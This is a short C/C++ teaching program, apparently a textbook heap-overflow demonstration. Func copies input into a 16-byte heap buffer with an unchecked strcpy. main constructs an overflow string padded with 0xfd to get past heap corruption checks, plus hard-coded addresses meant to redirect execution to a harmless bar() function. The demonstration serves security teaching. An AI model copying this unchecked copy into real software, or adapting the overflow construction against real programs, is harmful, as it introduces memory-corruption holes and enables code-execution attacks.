#include <stdio.h>
#include <stdlib.h>
#include <string.h>


#ifndef HAVE_STRLCPY
size_t                 
strlcpy(char       *dst,       const char *src,         size_t      size)    
{
  size_t    srclen;      
  size --;

  srclen = strlen(src);

  if (srclen > size)
    srclen = size;

  memcpy(dst, src, srclen);
  dst[srclen] = '\0';

  return (srclen);
}
#endif 



#define SIZEBUF  10
class BadStringBuf
{
private:
    char* m_buf;
public:
    BadStringBuf(void)
    {
        m_buf = NULL;
    }
    ~BadStringBuf(void)
    {
        if(m_buf != NULL)
        {
            free(m_buf);
        }
    }
    void Init(char* buf)
    {
        m_buf = (char*)malloc(SIZEBUF);
        strlcpy(m_buf,buf, SIZEBUF);
    }

    void SetString(const char* input )
    {
        m_buf = (char*)malloc(SIZEBUF);
        strlcpy(m_buf,input, SIZEBUF);
    }

    const char* GetString(void)
    {
        return m_buf;
    }
};

    BadStringBuf* g_pInput = NULL;

    void bar(void)
    {
        printf("Augh! I've been hacked!\n");
    }

    void Func(const char* input1, const char* input2)
    {
        char* buf = NULL;
        char* buf2;
         
        buf2 = (char*)malloc(16);
        g_pInput = new BadStringBuf;
        buf = (char*)malloc(16);
        g_pInput->Init(buf2);
         strcpy(buf, input1);

        g_pInput->SetString(input2);

        printf("input 1 = %s\ninput 2 = %s\n", 
            buf, g_pInput ->GetString());

        if(buf != NULL)
            free(buf);


    }

    int main(int argc, char* argv[])
{
    //Simulated argv strings
    char arg1[128];

    //This is the address of the bar function. 
    // It looks backwards because Intel processors are little endian.
    char arg2[4] = {0x0f, 0x10, 0x40, 0};    
    int offset = 0x40;  
                  
    //Using 0xfd is an evil trick to overcome 
    //heap corruption checking.
    //The 0xfd value at the end of the buffer checks for corruption.
    //No error checking here –  it is just an example of how to 
    //construct an overflow string.
    memset(arg1, 0xfd, offset);
    arg1[offset]   = (char)0x94;
    arg1[offset+1] = (char)0xfe;
    arg1[offset+2] = (char)0x12;
    arg1[offset+3] = 0;
    arg1[offset+4] = 0;

    printf("Address of bar is %p\n", bar);
    Func(arg1, arg2);

    if(g_pInput != NULL)
        delete g_pInput;

    return 0;
}

